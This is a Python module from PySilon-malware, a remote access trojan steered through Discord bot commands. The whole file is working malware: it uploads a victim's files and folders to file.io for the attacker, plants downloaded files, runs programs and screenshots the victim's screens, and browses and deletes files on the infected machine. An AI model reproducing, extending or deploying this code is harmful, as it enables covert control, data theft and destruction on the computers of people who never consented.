#<imports>
import resources.modules.misc as pysilon_misc
from shutil import copy2, rmtree
from bs4 import BeautifulSoup
from zipfile import ZipFile
from getpass import getuser
from PIL import ImageGrab
import subprocess
import requests
import json
import os
#</imports>


@client.command(name='download')
async def file_downloading(ctx, file_to_download=None):
    await ctx.message.delete()
    if file_to_download != None:
        if os.path.exists(file_to_download):
            target_file = file_to_download
            if os.path.isdir(target_file):
                target_file += '.zip'
                with ZipFile(target_file,'w') as zip:
                    for file in pysilon_misc.get_all_file_paths('.'.join(target_file.split('.')[:-1])):
                        try:
                            zip.write(file)
                        except Exception as e:
                            await ctx.send(e)
                            pass
            await ctx.send("```Uploading to file.io... This can take a while depending on the file size and the victim's internet speed...```")
            data = {'file': open(target_file, 'rb')}
            url = 'https://file.io/'
            response = requests.post(url, files=data)
            data = response.json()
            embed = discord.Embed(title=f"üü¢ {file_to_download}",description=f"Click [here](<{data['link']}>) to download.", colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
            await ctx.send('Warning: The file will be removed from file.io right after the first download.')
        else:
            embed = discord.Embed(title="üìõ Error",description=f'```‚ùó File or directory not found.```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="üìõ Error",description=f'```Syntax: .download <file-or-directory>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)

async def unzip(ctx, file):
    archive_password = None 

    def get_archive_pass(m):
        return m.content and m.channel == ctx.channel
    
    try:
        with ZipFile(file) as zip_file:
            embed = discord.Embed(title='üî¥ Hold on!', description='```This zip file is password protected.\n\nPlease send the password here.```', colour=discord.Colour.red())
            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
            
            try: zip_file.testzip()
            except: await ctx.send(embed=embed); archive_password = await client.wait_for('message', check=get_archive_pass); archive_password = archive_password.content

            zip_file.extractall(os.path.dirname(file), pwd=archive_password.encode()) if archive_password != None else zip_file.extractall(os.path.dirname(file))
            embed = discord.Embed(title='üü¢ Success', description='```The zip file has been successfully extracted.```', colour=discord.Colour.green())
            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
            await ctx.send(embed=embed)
    except:
        embed = discord.Embed(title='üìõ Error', description='Failed to unzip the file.', colour=discord.Colour.red())
        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
        return await ctx.send(embed=embed)

@client.command(name='upload')
async def file_uploading(ctx, argument=None, name_of_file=None):
    await ctx.message.delete()

    async def is_archive(filename):
        embed = discord.Embed(title='üîµ Zip file detected', description='```Would you like to unzip it?```', colour=discord.Colour.blue())
        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
        reaction_message = await ctx.send(embed=embed); await reaction_message.add_reaction('‚úÖ'); await reaction_message.add_reaction('‚ùå')
        
        def extract_zipfile_user_confirm(reaction, user):
            return str(reaction.emoji) in ['‚úÖ', '‚ùå'] and user == ctx.author
        
        try:
            reaction, user = await client.wait_for('reaction_add', check=extract_zipfile_user_confirm)
            if str(reaction.emoji) == '‚úÖ':
                await unzip(ctx, filename)
        except asyncio.TimeoutError: await ctx.send("```‚ùó Reaction listener has timed out.```")

    if argument == 'small':
        embed = discord.Embed(title='üì§ Waiting for file...', description='Send the file you wish to upload here.', colour=discord.Colour.blue())
        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
        await ctx.send(embed=embed)
        
        def wait_for_discord_file(m):
            return m.attachments and m.channel == ctx.channel
        msg = await client.wait_for('message', check=wait_for_discord_file)
        
        try:
            filename = msg.attachments[0].filename
            await msg.attachments[0].save(fp='/'.join(working_directory) + '/' + filename)
        except: return await ctx.send("```‚ùó File failed to upload.```")

        embed = discord.Embed(title=f"üü¢ Success",description=f"Your file `{filename}` has been successfully uploaded.", colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed) 

        if filename.endswith('.zip'):
            await is_archive('/'.join(working_directory) + '/' + filename)   

    elif argument == 'big':
        if name_of_file != None:
            embed = discord.Embed(title='üì§ Waiting for file...', description='Please upload your file to [file.io](<https://file.io/>) and send the link here.', colour=discord.Colour.blue())
            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
            await ctx.send(embed=embed)

            def wait_for_file_io_link(m):
                return m.content and m.channel == ctx.channel
            target_file = await client.wait_for('message', check=wait_for_file_io_link)
            target_file = target_file.content

            if not target_file.startswith("https://file.io"): return await ctx.send("```‚ùó Your message did not contain a file.io link.```")

            html_content = f'''
            <a href="{target_file}" download="download" title="Download"></a>
            '''
            soup = BeautifulSoup(html_content, 'html.parser')
            download_link = soup.find('a')['href']
            response = requests.get(download_link)

            if response.status_code == 200:
                with open('/'.join(working_directory) + '/' + name_of_file, 'wb') as f:
                    f.write(response.content)
            else: return await ctx.send("```‚ùó File failed to upload.```")
            
            embed = discord.Embed(title=f"üü¢ Success",description=f"Your file `{name_of_file}` has been successfully uploaded.", colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)

            if name_of_file.endswith('.zip'):
                await is_archive('/'.join(working_directory) + '/' + name_of_file)

        else:
            embed = discord.Embed(title="üìõ Error",description=f'```Syntax: .upload big <file_name.ext>```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
        
    else:
        embed = discord.Embed(title="üìõ Error",description=f'```Syntax: .upload <small / big>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)

@client.command(name="unzip")
async def unzip_command(ctx, filename=None):
    await ctx.message.delete()

    if filename != None and filename.endswith(".zip"):
        if os.path.exists('/'.join(working_directory) + '/' + filename): await unzip(ctx, '/'.join(working_directory) + '/' + filename)
        elif os.path.exists(filename): await unzip(ctx, filename)
        else: await ctx.send('```‚ùó Archive not found```')
    else:
        embed = discord.Embed(title="üìõ Error",description=f'```Syntax: .unzip <path/to/zip_file>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)

@client.command(name="mkdir")
async def create_directory(ctx, path=None):
    await ctx.message.delete()
    if path != None:
        try:
            if os.path.isabs(path): 
                os.mkdir(path)
            else:
                os.mkdir('/'.join(working_directory) + '/' + path)
            embed = discord.Embed(title=f"üü¢ Success",description=f"```Directory {path} has been successfully created.```", colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
            
        except Exception as e:
            embed = discord.Embed(title="üìõ Error",description=f'```Something went wrong.\n\n{str(e)}```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="üìõ Error",description=f'```Syntax: .mkdir <path>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)

@client.command(name="execute")
async def execute_file(ctx, file_to_exec=None):
    await ctx.message.delete()

    async def execution(ctx, file_to_exec):
        try:
            subprocess.run('start "" "' + file_to_exec + '"', shell=True)
            await asyncio.sleep(1)
            ImageGrab.grab(all_screens=True).save('ss.png')
            await ctx.send(embed=discord.Embed(title=pysilon_misc.current_time() + ' `[Executed: ' + file_to_exec + ']`').set_image(url='attachment://ss.png'), file=discord.File('ss.png'))
            subprocess.run('del ss.png', shell=True)
            await ctx.send('```Successfully executed: ' + file_to_exec + '```')
        except Exception as e:
            await ctx.send(f'```‚ùó Something went wrong...```\n{str(e)}')

    if file_to_exec != None:
        if os.path.exists('/'.join(working_directory) + '/' + file_to_exec):
            await execution(ctx, '/'.join(working_directory) + '/' + file_to_exec)
        elif os.path.exists(file_to_exec):
            await execution(ctx, file_to_exec) 
        else:
            embed = discord.Embed(title="üìõ Error",description=f'```File or directory not found!```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="üìõ Error",description=f'```Syntax: .execute <path/to/file>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)

@client.command(name="cd")
async def travarse_working_dir(ctx, path=None):
    if path != None:
        if os.path.isdir('/'.join(working_directory) + '/' + path):
            if '/' in path:
                for dir in path.split('/'):
                    if dir == '..':
                        working_directory.pop(-1)
                    else:
                        working_directory.append(dir)
            else:
                if path == '..':
                    working_directory.pop(-1) 
                else:
                    working_directory.append(path)
            await ctx.send('```You are now in: ' + '/'.join(working_directory) + '```')
            save_working_dir()
        else:
            if os.path.isdir(path): 
                working_directory.clear()
                for dir in path.split('/'):
                    working_directory.append(dir)
                await ctx.send('```You are now in: ' + '/'.join(working_directory) + '```')
                save_working_dir()
            else:
                await ctx.send('```‚ùó Directory not found.```')

@client.command(name="ls")
async def list_working_directory(ctx):
    await ctx.message.delete() 
    dir_content_f, dir_content_d, directory_content = [], [], []

    for element in os.listdir('/'.join(working_directory)+'/'):
        if os.path.isfile('/'.join(working_directory)+'/'+element): dir_content_f.append(element)
        else: dir_content_d.append(element)

    dir_content_d.sort(key=str.casefold); dir_content_f.sort(key=str.casefold)

    for single_directory in dir_content_d: directory_content.append(single_directory)
    for single_file in dir_content_f: directory_content.append(single_file)

    await ctx.send('```Content of ' + '/'.join(working_directory) +'/ at ' + pysilon_misc.current_time() + '```')
    lsoutput = directory_content
    while lsoutput != []:
        if len('\n'.join(lsoutput)) > 1994:
            temp = ''
            while len(temp+lsoutput[0])+1 < 1994:
                temp += lsoutput[0] + '\n'
                lsoutput.pop(0)
            await ctx.send('```' + temp + '```')
        else:
            await ctx.send('```' + '\n'.join(lsoutput) + '```')
            lsoutput = []

@client.command(name="pwd")
async def print_working_directory(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title=f"üü£ System",description=f"Current directory: `{'/'.join(working_directory)}`", colour=discord.Colour.purple())
    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
    await ctx.send(embed=embed)

@client.command(name="remove")
async def remove_files(ctx, argument): 
    await ctx.message.delete()

    async def remove_file_func(ctx, argument):
        try:
            if os.path.isfile(argument):
                argument = argument.replace('/', '\\')
                subprocess.run('del "' + argument + '"', shell=True)
            else:
                rmtree(argument)

            embed = discord.Embed(title="üü¢ Success",description=f'Successfully removed `{argument}`.', colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)

        except Exception as e:
            embed = discord.Embed(title="üìõ Error",description=f'`' + str(e) + '`', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)

    if argument != None:
        if os.path.exists('/'.join(working_directory) + '/' + argument): await remove_file_func(ctx, '/'.join(working_directory) + '/' + argument)
        elif os.path.exists(argument): await remove_file_func(ctx, argument)
        else:
            embed = discord.Embed(title="üìõ Error",description=f'```File or directory not found.```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="üìõ Error",description=f'```Syntax: .remove <file-or-directory>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)